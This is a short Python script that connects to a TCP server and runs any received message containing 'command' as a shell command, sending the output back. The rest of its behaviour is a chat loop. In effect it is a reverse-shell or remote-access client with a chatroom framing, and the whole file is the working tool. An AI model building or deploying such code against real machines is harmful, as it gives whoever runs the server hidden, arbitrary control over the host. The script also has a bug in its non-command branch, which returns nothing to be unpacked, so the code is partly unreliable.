import socket
import subprocess
import os


host = '127.0.0.1'
port = int(input("Enter a port: "))

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))
server.send('connected'.encode())


def chatroom():
    while True:
        msg = input('Type a message: ')
        server.send(msg.encode())
        data = server.recv(1024).decode()
        print(data)


def message_indentify(message):
    if "command" in message:
        message = message.split(' ', 2)[-1]
        result = subprocess.run(message, capture_output=True, shell=True)
        result_out = result.stdout.decode()
        result_error = result.stderr.decode()
        return result_out, result_error
    else:
        server.send('Do you want to talk to me?'.encode())
        data = server.recv(1024).decode()
        if data == 'yes':
            chatroom()


while True:
    data = server.recv(1024).decode()
    data, error = message_indentify(data)
    message = f'Data: {data} | Error: {error}'
    server.send(message.encode())
